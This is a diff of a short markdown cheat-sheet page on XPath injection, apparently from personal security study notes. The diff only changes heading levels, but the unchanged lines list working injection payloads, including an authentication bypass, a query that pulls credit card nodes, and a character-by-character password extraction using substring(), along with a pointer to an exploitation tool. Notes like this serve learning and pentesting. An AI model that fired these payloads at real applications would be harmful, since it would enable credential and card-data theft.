@@ -3,8 +3,9 @@ layout: page
 title:  "XPath injections"
 permalink: "xpath-injections.html"
 tags: [security, injections, web]
+summary: ""
 ---
-# Introduction
+## Introduction
 * XPath: XML Path Language. Interpreted language to navigate XML documents.
   XPath expression: sequence of steps required to navigate from one node to another
 * XML files used to store applications configuration, and sometimes credentials, roles and privileges
@@ -12,7 +13,7 @@ tags: [security, injections, web]
 * Keywords and tag names in XML documents are case-sensitive
 * Strategy: when regular SQL injections fail, it might be an XPath injection
 
-# Example of queries
+## Example of queries
 * Retrieve all email addresses: `//address/email/text()`
 * Retrieve all information under `address` for the user Dawes: `//address[surname/text()='Dawes']`
 * Credential verification: `//address[surname/text()='$user' and password/text()='$pass']`
@@ -22,7 +23,7 @@ tags: [security, injections, web]
 * Substring extraction: `substring(//user/name/text(), start, n_char)`
 
 
-# Injections
+## Injections
 * Testing: `'`, `' or 'a'='a`
 * `//address[surname/text()]='Dawes' and password/text()='' or 'a'='a']/ccard/text()`
 * Password dump: `' or //address[surname/text()='Dave' and substring(password/text(), 1, 1)= 'A'] and 'a'='a` return results if the first letter or the password is 'A'
@@ -44,7 +45,7 @@ tags: [security, injections, web]
 
 
 
-# Resources
+## Resources
 * XPath injection - authentication Root-me solutions
 * XPath memo: EN - Introduction to Xpath injection techniques.pdf
 * [Xcat tool](https://github.com/orf/xcat)
